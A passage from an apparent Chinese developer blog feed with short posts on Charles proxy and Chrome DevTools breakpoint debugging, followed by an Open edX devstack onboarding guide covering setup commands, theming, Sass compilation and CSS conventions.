charles抓不到localhost</h3><p>将<code>localhost:4000</code>修改为<code>localhost.charlesproxy.com</code></p><p><br></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://juejin.im/post/5b4f005ae51d45191c7e534a" target="_blank" rel="noopener">Charles 抓包二三谈</a></li></ul>]]></content>
      
      <categories>
          
          <category> Debug </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Chrome断点调试</title>
      <link href="/2019/05/24/Chrome%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95/"/>
      <url>/2019/05/24/Chrome%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95/</url>
      <content type="html"><![CDATA[<blockquote><p>断点调试是指自己在程序的某一行设置一个断点，调试时，程序运行到这一行就会停住，然后你可以一步一步往下调试，调试过程中可以看到各个变量当前的值。</p></blockquote><p><br></p><h3 id="1-Sources面板"><a href="#1-Sources面板" class="headerlink" title="1. Sources面板"></a>1. Sources面板</h3><p>Sources是Chrome developer tool中的断点调试面板。<br><br><br><img src="/2019/05/24/Chrome断点调试/1.png" style="max-width:500px"><br>【图1】网站文件目录树<br>【图2】左侧所选文件的具体内容<br>【图3】scope显示当前断点的作用域，watch点击 + 号可添加你需要监控的变量或表达式<br>【图4】核心功能区<br>Call Stack: 显示当前断点的环境调用栈<br>Breakpoints: 当前js断点列表<br>DOM Breakpoints: 当前DOM断点列表<br>XHR Breakpoints: 当前xhr断点列表，点击 + 添加断点<br>Event Listener Breakpoints: 当前事件监听断点列表</p><p><br></p><h3 id="2-设置断点"><a href="#2-设置断点" class="headerlink" title="2. 设置断点"></a>2. 设置断点</h3><h4 id="2-1-JS断点"><a href="#2-1-JS断点" class="headerlink" title="2.1 JS断点"></a>2.1 JS断点</h4><h5 id="2-1-1-手动加断点"><a href="#2-1-1-手动加断点" class="headerlink" title="2.1.1 手动加断点"></a>2.1.1 手动加断点</h5><p>打开开发者工具 —— 点击Source菜单 —— 左侧树中找到相应文件 —— 点击行列号，即完成当前行添加/删除断点操作。断点添加完毕后，刷新页面js执行到断点位置停住。在Sources界面，会看到当前作用域中所有变量和值，只需对每个值进行验证即可。<br>你还可以设置条件断点，右击断点位置，选择Edit Breakpoint，设置触发断点的表达式，表达式为true时才触发断点。</p><p><br></p><h5 id="2-1-2-debugger"><a href="#2-1-2-debugger" class="headerlink" title="2.1.2 debugger"></a>2.1.2 debugger</h5><p>还可以在代码中添加<code>debugger;</code>，代码执行到该语句时就会自动断点。</p><p><br></p><h5 id="2-1-3-功能键"><a href="#2-1-3-功能键" class="headerlink" title="2.1.3 功能键"></a>2.1.3 功能键</h5><p>断点调试主要用到以下功能键，从左到右依次为</p><p><img src="/2019/05/24/Chrome断点调试/3.png" style="max-width:500px"></p><ul><li>Pause/Resume script execution: 暂停/恢复脚本执行（程序执行到下一个断点停止）</li><li>Step over next function call: 执行到下一步的函数调用(跳到下一行)</li><li>Step into next function call: 进入当前函数</li><li>Step out of current function: 跳出当前执行函数</li><li>Deactive/Active all breakpoints: 关闭/开启所有断点（不会取消）</li><li>Pause on exceptions: 异常情况自动断点设置</li></ul><p><br></p><h5 id="2-1-4-解压js"><a href="#2-1-4-解压js" class="headerlink" title="2.1.4 解压js"></a>2.1.4 解压js</h5><p>如果碰到压缩后的js代码，可以点击下面的按钮解压</p><p><img src="/2019/05/24/Chrome断点调试/6.png" style="max-width:500px"></p><p><br></p><h4 id="2-2-DOM断点"><a href="#2-2-DOM断点" class="headerlink" title="2.2 DOM断点"></a>2.2 DOM断点</h4><p>打开Elements面板 —— 定位到相关DOM节点 —— 右击DOM，选择Break on，选择相应选项<br><em>subtree modifications</em><br>子节点变化断点。针对子节点增加、删除以及交换顺序等操作，但子节点进行属性修改和内容修改并不会触发断点<br><em>attributes modifications</em>:节点属性断点<br><em>node removal</em>: 节点移除断点<br><br><br><img src="/2019/05/24/Chrome断点调试/2.png" style="max-width:500px"></p><p><br></p><h4 id="3-XHR断点"><a href="#3-XHR断点" class="headerlink" title="3. XHR断点"></a>3. XHR断点</h4><p>通过XHR Breakpoints 的 + 号，当异步请求URL满足条件时，会自动产生断点。<br><br><br><img src="/2019/05/24/Chrome断点调试/4.gif" style="max-width:500px"></p><p><br></p><h4 id="4-事件监听断点"><a href="#4-事件监听断点" class="headerlink" title="4. 事件监听断点"></a>4. 事件监听断点</h4><p>当事件被触发时，断点到事件绑定的位置。包括鼠标、键盘、动画、定时器、xhr等。<br><br><br><img src="/2019/05/24/Chrome断点调试/5.gif" style="max-width:500px"></p><p><br></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://www.cnblogs.com/yzg1/p/5578363.html" target="_blank" rel="noopener">chrome developer tool—— 断点调试篇</a></li><li><a href="https://juejin.im/post/5af53823f265da0b75282b0f" target="_blank" rel="noopener">chrome开发者工具各种骚技巧</a></li></ul>]]></content>
      
      <categories>
          
          <category> Debug </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>快速开始Edx-H版开发</title>
      <link href="/2019/05/09/%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8edx/"/>
      <url>/2019/05/09/%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8edx/</url>
      <content type="html"><![CDATA[<h3 id="1-前提"><a href="#1-前提" class="headerlink" title="1. 前提"></a>1. 前提</h3><p>要快速入门edx，首先你可以体验一下英荔商学院，</p><ul><li>阿里云生产服  <a href="https://www.elitemba.cn/" target="_blank" rel="noopener">https://www.elitemba.cn/</a></li><li>腾讯云测试服 lms <a href="http://www.eliteu.xyz/" target="_blank" rel="noopener">http://www.eliteu.xyz/</a></li><li>腾讯云测试服 cms <a href="http://studio.eliteu.xyz/" target="_blank" rel="noopener">http://studio.eliteu.xyz/</a></li></ul><p>同时还可以</p><ul><li>通过edx官方文档进一步了解  <a href="http://docs.edx.org/" target="_blank" rel="noopener">http://docs.edx.org/</a></li><li>其他用edx搭建的网站：<a href="http://www.xuetangx.com/" target="_blank" rel="noopener">http://www.xuetangx.com/</a> , <a href="https://www.edx.org" target="_blank" rel="noopener">https://www.edx.org</a></li></ul><p>了解edx H版前，你需要掌握一些基本知识</p><ul><li>Docker <a href="https://docs.docker.com/" target="_blank" rel="noopener">https://docs.docker.com/</a> </li><li>git    <a href="https://git-scm.com/book/zh/v2" target="_blank" rel="noopener">https://git-scm.com/book/zh/v2</a></li><li>React  <a href="https://react.docschina.org/" target="_blank" rel="noopener">https://react.docschina.org/</a></li><li>Sass   <a href="https://www.sass.hk/" target="_blank" rel="noopener">https://www.sass.hk/</a></li></ul><p><br></p><h3 id="2-安装启动"><a href="#2-安装启动" class="headerlink" title="2. 安装启动"></a>2. 安装启动</h3><h4 id="2-1-安装项目"><a href="#2-1-安装项目" class="headerlink" title="2.1 安装项目"></a>2.1 安装项目</h4><p>这里假设你已经完成安装，如果没有，<a href="https://github.com/edx/devstack" target="_blank" rel="noopener">前往安装</a>。<br>拉取公司最新代码，修改配置文件。每个文件夹对应一个git仓库<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">└── devstack  </span><br><span class="line">└── ecommerce       # 单课购买        https://github.com/e-ducation/ecommerce</span><br><span class="line">└── edx-membership  # 会员购买        https://github.com/e-ducation/edx-membership</span><br><span class="line">└── edx-platform    </span><br><span class="line">    # lms学习平台, cms创建课程平台      https://github.com/e-ducation/edx-platform</span><br><span class="line">└── eliteu-payments # 微信支付宝支付   https://github.com/e-ducation/eliteu-payments</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="2-1-启动项目"><a href="#2-1-启动项目" class="headerlink" title="2.1 启动项目"></a>2.1 启动项目</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd devstack</span><br><span class="line">make dev.up   # 启动项目</span><br></pre></td></tr></table></figure><p>启动服务后，每个服务都可以在<code>localhost</code>的特定端口被访问(<code>docker ps</code>查看所有url)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Service           URL</span><br><span class="line">E-commerce        http://localhost:18130/dashboard/</span><br><span class="line">LMS               http://localhost:18000/</span><br><span class="line">Studio/CMS        http://localhost:18010/</span><br></pre></td></tr></table></figure></p><p>本地环境会自动创建一个超级用户<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Email: edx@example.com</span><br><span class="line">Username: edx</span><br><span class="line">Password: edx</span><br></pre></td></tr></table></figure></p><p>LMS还提供了不同身份的账号<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Username    Email                   Password</span><br><span class="line">audit      audit@example.com       edx</span><br><span class="line">honor      honor@example.com       edx</span><br><span class="line">staff      staff@example.com       edx</span><br><span class="line">verified  verified@example.com    edx</span><br></pre></td></tr></table></figure></p><p>有了这些url和账号密码，你可以在本地把业务流程都走一遍：<br>创建课程，使用优惠券购买单课，会员购买，课程学习——习题，讨论，维基，教师面板等</p><p><br></p><h4 id="2-2-常用命令"><a href="#2-2-常用命令" class="headerlink" title="2.2 常用命令"></a>2.2 常用命令</h4><p>使用<code>make</code>命令可以查看所有make命令，下面列举一些常用操作。<a href="https://github.com/edx/devstack" target="_blank" rel="noopener">更多命令查看</a></p><ul><li><p><em>修改配置文件</em><br>通过<code>make &lt;service&gt;-shell</code>进入容器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> 进入lms容器</span><br><span class="line">make lms-shell</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 进入lms-shell后，你可以修改各种配置文件</span><br><span class="line">/edx/app/edxapp/lms.env.json</span><br><span class="line">/edx/app/edxapp/lms.auth.json</span><br><span class="line">/edx/app/edxapp/cms.env.json</span><br><span class="line">/edx/app/edxapp/cms.auth.json</span><br></pre></td></tr></table></figure></li><li><p><em>查看日志</em></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> 查看运行中的容器的日志</span><br><span class="line">make logs</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 查看特定的容器的日志</span><br><span class="line">make lms-logs</span><br><span class="line">make discovery-logs</span><br></pre></td></tr></table></figure></li><li><p><em>编译静态资源</em></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> 编译lms静态资源</span><br><span class="line">make lms-static  </span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 只编译normal-theme(英荔的主题包)</span><br><span class="line">make lms-shell</span><br><span class="line">paver update_assets --theme-dirs=/edx/app/edxapp/edx-platform/themes --themes=normal-theme</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 自动编译sass文件</span><br><span class="line">make lms-shell</span><br><span class="line">paver watch_assets --td /edx/app/edxapp/edx-platform/themes --t normal-theme</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 如果在执行paver命令时遇到了异常，加上--settings=devstack_docker查看报错信息</span><br><span class="line">paver update_assets --settings=devstack_docker</span><br></pre></td></tr></table></figure></li><li><p><em>更新数据库</em></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">make lms-shell</span><br><span class="line">paver update_db</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 只更新lms的某个app</span><br><span class="line"><span class="meta">#</span> 更新/edx-platform/lms/djangoapps/badges, appname为badges</span><br><span class="line">make lms-shell</span><br><span class="line">source /edx/app/edxapp/edxapp_env</span><br><span class="line">cd /edx/app/edxapp/edx-platform</span><br><span class="line">./manage.py &lt;lms/cms&gt; makemigrations &lt;appname&gt; --settings=devstack_docker</span><br><span class="line">./manage.py &lt;lms/cms&gt; migrate &lt;appname&gt; --settings=devstack_docker</span><br></pre></td></tr></table></figure></li><li><p><em>重启服务</em></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> service可取值: discovery, ecommerce, lms, studio</span><br><span class="line">docker-compose restart &lt;service&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 或者直接使用make命令</span><br><span class="line">make lms-restart</span><br></pre></td></tr></table></figure></li><li><p><em>停止所有服务</em></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make stop</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="3-代码修改"><a href="#3-代码修改" class="headerlink" title="3. 代码修改"></a>3. 代码修改</h3><p>前端代码修改主要包括</p><ul><li><p>主题样式<br>根据设计稿，响应式布局，一个页面兼容pc，手机，需考虑中英文两种情况。兼容到IE11</p></li><li><p>浏览器兼容<br>js不生效，样式兼容</p></li><li><p>翻译修改<br>翻译未包，修改英文文案</p></li><li><p>新增页面<br>教授介绍页，membership会员介绍页，会员购买页(微信支付宝)，课程简介html编写等</p></li><li><p>修改功能<br>①登录账号可输入邮箱，变为可输入手机+邮箱；<br>②绑定手机<br>③生成证书图片；<br>④接入微信sdk实现转发课程详情页显示链接头像，等等</p></li><li><p>协助后端解决bug</p></li></ul><p><br><br><br></p><h3 id="4-配置主题"><a href="#4-配置主题" class="headerlink" title="4. 配置主题"></a>4. 配置主题</h3><p>先阅读<a href="https://edx.readthedocs.io/projects/edx-installing-configuring-and-running/en/latest/configuration/changing_appearance/theming/index.html" target="_blank" rel="noopener">官方文档</a>，了解主题包如何创建，修改，配置。</p><p><em>主题包可以放什么文件 ？</em><br>To override the files that constitute the default Open edX theme, you create replacements for one or more of those files, place them in the file paths that are constructed and named in parallel to the default file locations, configure your Open edX instance to use the files in your theme’s directories instead of the default locations, and then compile the theme.<br>(EdX first looks for files in your theme directories, and uses any file that matches the exact file path and file name of a default UI file.)<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/edx-platform/lms/static/images</span><br><span class="line">/edx-platform/lms/static/sass</span><br><span class="line">/edx-platform/lms/templates</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 想要覆盖上面的文件，需要在主题包里创建对应的文件</span><br><span class="line">/themes/normal-theme/lms/static</span><br><span class="line">/themes/normal-theme/lms/sass</span><br><span class="line">/themes/normal-theme/lms/templates</span><br></pre></td></tr></table></figure></p><p><br><br><em>添加主题包</em><br>在<code>/edx-platform/themes</code>新建一个文件夹<code>normal-theme</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">normal-theme</span><br><span class="line">    ├── README.rst</span><br><span class="line">    ├─── lms</span><br><span class="line">    |     ├── static</span><br><span class="line">    |     |      └── images</span><br><span class="line">    |     |      |     └── logo.png</span><br><span class="line">    |     |      |</span><br><span class="line">    |     |      └── sass</span><br><span class="line">    |     |            └── partials</span><br><span class="line">    |     |                   └── base</span><br><span class="line">    |     |                        └── _variables.scss</span><br><span class="line">    |     |</span><br><span class="line">    |     └── templates</span><br><span class="line">    |             └── footer.html</span><br><span class="line">    |             └── header.html</span><br></pre></td></tr></table></figure></p><p><br><br><em>修改配置文件</em><br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> 进入文件目录</span><br><span class="line">make lms-shell</span><br><span class="line">cd /edx/app/edxapp</span><br><span class="line">LMS         /edx/app/edxapp/lms.env.json</span><br><span class="line">Studio       /edx/app/edxapp/cms.env.json</span><br><span class="line">E-commerce   /edx/etc/ecommerce.yml</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 修改配置项</span><br><span class="line">"ENABLE_COMPREHENSIVE_THEMING": true,</span><br><span class="line">"COMPREHENSIVE_THEME_DIRS": [</span><br><span class="line">  "/edx/app/edxapp/edx-platform/themes"</span><br><span class="line">],</span><br><span class="line">"THEME_NAME": "normal-theme",</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 重启服务</span><br><span class="line">docker-compose restart lms</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 编译静态资源</span><br><span class="line">make lms-static</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 进入`localhost:18000/admin`,进入Site themes, 添加site themes。保存后，访问0.0.0.0:18000即生效。</span><br><span class="line">Site:</span><br><span class="line">Domain name: 0.0.0.0:18000</span><br><span class="line">Display name: normal-theme</span><br><span class="line">Theme dir name: normal-theme</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="5-主题修改"><a href="#5-主题修改" class="headerlink" title="5. 主题修改"></a>5. 主题修改</h3><p>改edx主题是一件非常痛苦的事件。每改一个地方，需要执行一次编译命令，才能看到效果。快则1分钟，慢则20分钟。同时，edx的模板层层嵌套，同一个className会应用到多个页面，牵一发动全身。加上className又长又乱，css也是没啥章法，<code>border-box</code>与<code>content-box</code>混用，样式乱加<code>!important</code>，很多时候你不得不再强制加一个<code>!important</code>去覆盖它。加上本身没有使用任何基础库，因此衍生出很多兼容问题。</p><ul><li>值得高兴的是，大部分页面都已经完成了样式调整。</li><li>开发环境走了另一套编译，你无需执行edx的编译命令，就可以看到修改效果。</li><li>如果有新增的需求，你需要遵循一些设计规范。</li></ul><p><br></p><h4 id="5-1-sass编译"><a href="#5-1-sass编译" class="headerlink" title="5.1 sass编译"></a>5.1 sass编译</h4><p>先确保安装了<a href="https://www.sass.hk/install/" target="_blank" rel="noopener">Sass</a><br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> edx-platform编译</span><br><span class="line"><span class="meta">#</span> 注意，当编译不是主题包里面的sass文件时，依然要走edx的编译命令 make lms-static</span><br><span class="line">cd edx-platform/themes/normal-theme/lms/static/</span><br><span class="line">sass --watch sass:css --no-cache</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> edx-membership编译</span><br><span class="line">cd edx-membership/membership/static/membership/</span><br><span class="line">sudo sass --watch sass:css --no-cache</span><br></pre></td></tr></table></figure></p><p>edx不同页面引用了不同的css文件，因此产生了很多入口文件，具体见<code>/edx-platform/lms/static/sass</code>，里面没有以<code>_</code>开头的文件都是一个入口文件。</p><p>当你需要新增一个入口文件，应当先将其对应的css文件<code>/edx-platform/lms/static/css</code>转换为scss文件，复制到<code>normal-theme/lsm/static/sass/default</code>。入口文件，应先引用该文件，代表着先引用了edx原有样式。然后你可以把你的修改放进<code>normal-theme/lsm/static/sass/modify</code>文件。</p><p>当edx升级版本时，你需要更新<code>/default</code>的内容。而你额外的修改将得到保留。当然如果发生了翻天覆地的变动，就另说。<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">normal-theme/lsm/static/sass</span><br><span class="line">    ├─── bootstrap</span><br><span class="line">    |     ├── lms-main.scss  # 入口文件</span><br><span class="line">    ├─── default             # edx原有样式</span><br><span class="line">    |     ├── _lms-course.scss</span><br><span class="line">    |     ├── _lms-discussion-bootstrap.scss</span><br><span class="line">    |     ├── _lms-main-v1.scss</span><br><span class="line">    |     ├── _lms-main-v2.scss</span><br><span class="line">    |     ├── _lms-main.scss</span><br><span class="line">    ├─── discussion</span><br><span class="line">    |     ├── lms-discussion-bootstrap.scss  # 入口文件</span><br><span class="line">    ├─── modify</span><br><span class="line">    |     ├── lms</span><br><span class="line">    |     |      └── course            # 课程相关</span><br><span class="line">    |     |      └── footer            </span><br><span class="line">    |     |      └── page              </span><br><span class="line">    |     |      └── _extras.scss      # 集合了header,footer,iconfont,base,alert等共用规则，所有入口文件均可先引用这一文件</span><br><span class="line">    |     |      └── _variables.scss   # 定义sass变量</span><br><span class="line">    ├─── lms-course.scss     # 入口文件</span><br><span class="line">    ├─── lms-main-v1.scss    # 入口文件</span><br><span class="line">    ├─── lms-main-v2.scss    # 入口文件</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="5-2-一些规范"><a href="#5-2-一些规范" class="headerlink" title="5.2 一些规范"></a>5.2 一些规范</h4><ul><li><em>适配要求</em><br>pc响应式布局，兼容ipad，手机，兼容IE11<br>图片资源pc使用二倍图，手机使用三倍图<br>pc设计稿尺寸1400px*auto (内容1200px*auto), 手机设计稿尺寸375px*auto<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/* 兼容ipad */</span></span><br><span class="line">@<span class="keyword">media</span> screen and (max-width:<span class="number">768px</span>)&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 兼容手机，考虑了部分手机横屏的情况 */</span></span><br><span class="line">@<span class="keyword">media</span> screen and (max-width:<span class="number">767px</span>)&#123;&#125;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><ul><li><em>变量</em><br>更多变量查看 <code>/edx-platform/themes/normal-theme/lms/static/sass/modify/lms/_variables.scss</code>，设计稿有时不会100%按这个标准，此时应优先使用这些变量。<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 主色调 */</span> </span><br><span class="line">$primary: #4788C7;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 字体颜色: 标题，正文，注释，placeholder */</span> </span><br><span class="line">$title: #2E313C;</span><br><span class="line">$font: #656D78;</span><br><span class="line">$note: #AAB2BD;</span><br><span class="line">$placeholder: #ccd1d9;</span><br><span class="line">$font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto,"Helvetica Neue", Helvetica,Tahoma，Arial, "PingFang SC", "Hiragino Sans GB", </span><br><span class="line">"<span class="selector-tag">Heiti</span> <span class="selector-tag">SC</span>", "<span class="selector-tag">Microsoft</span> <span class="selector-tag">YaHei</span>", "<span class="selector-tag">WenQuanYi</span> <span class="selector-tag">Micro</span> <span class="selector-tag">Hei</span>",<span class="selector-tag">SimHei</span>，<span class="selector-tag">sans-serif</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* border */</span></span><br><span class="line">$border:#b6dcfe;</span><br><span class="line">$border-gray: #f5f7fa;</span><br><span class="line">$border-radius: 3px;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 正文字体统一为14px */</span></span><br></pre></td></tr></table></figure></li></ul><p><br></p><ul><li><em>通用样式</em><br>查看<code>/edx-platform/themes/normal-theme/lms/static/sass/modify/lms/page/_base.scss</code>，这个文件定义了button, input, select, <code>&lt;a&gt;</code>的样式。开发时应统一使用这些变量。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">@extend %btn-my-primary;</span><br><span class="line">@extend %btn-my-white;</span><br><span class="line">@extend %btn-my-disable;</span><br><span class="line"></span><br><span class="line">@extend %input-my;</span><br><span class="line">@extend %input-my-checkbox;</span><br><span class="line">@extend %input-my-radio;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><ul><li><p><em>避免修改外层div的class样式</em><br>edx所有页面均被下面两个<code>&lt;div&gt;</code>包裹，注意不要轻易修改、新增这两个className的样式，不然其他页面都会发生变动。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"window-wrap"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"content-wrapper"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>除了这两个className，页面里面也有很多很多很多共用的className。<br>修改sass的时候，应当在外面包一个专属这个页面的className，避免影响到其他页面</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/edx-platform/themes/normal-theme/lms/static/sass/modify/lms/page/_login.scss</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 只对login-register下的h2生效 */</span></span><br><span class="line"><span class="selector-class">.login-register</span>&#123;</span><br><span class="line">  h2&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><ul><li><em>替换icon</em><br>icon使用雪碧图替换，具体查看<code>/edx-platform/themes/normal-theme/lms/static/sass/modify/lms/page/_iconfont.scss</code></li></ul><p><br></p><h4 id="5-3-替换templates"><a href="#5-3-替换templates" class="headerlink" title="5.3 替换templates"></a>5.3 替换templates</h4><p>如果需要修改/templates，需把原来的模板文件复制一份，放到主题下，在其基础上修改。<br>当模板里需要添加图片需使用<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"$&#123;static.url("</span><span class="attr">images</span>/<span class="attr">logo.svg</span>")&#125; "&gt;</span></span><br></pre></td></tr></table></figure></p><p>Note that the code snippet ${static.url(“images/logo.svg”)} directs Mako to leverage the comprehensive theming system, which will first check to see if your custom theme contains the file “logo.svg”, and if so, then this is the image file that will be sent to the browser. </p><p>All image files and other “static assets” are pre-processed using an open source utility named Paver that consolidates the files into a caching area located in <code>/edx/var/edxapp/staticfiles</code> whereupon each file is individually optimized.</p><p><br></p><h3 id="6-edx前端技术选型"><a href="#6-edx前端技术选型" class="headerlink" title="6. edx前端技术选型"></a>6. edx前端技术选型</h3><p>Edx前端囊括了展示给用户的所有东西，主要包括用Python渲染的views，用js写的页面交互，和css样式。</p><p><em>Edx相关技术</em></p><ul><li>Test: React components can be tested in isolation with unit tests using <code>Jest</code> and <code>Enzyme</code>.</li><li>ES6</li><li>Babel</li><li>ESLint</li><li>npm</li><li>GreenKeeper</li><li>webpack</li><li>AMD(异步模块定义）</li><li>Sass</li><li>JWT</li><li>Axios</li><li>React and 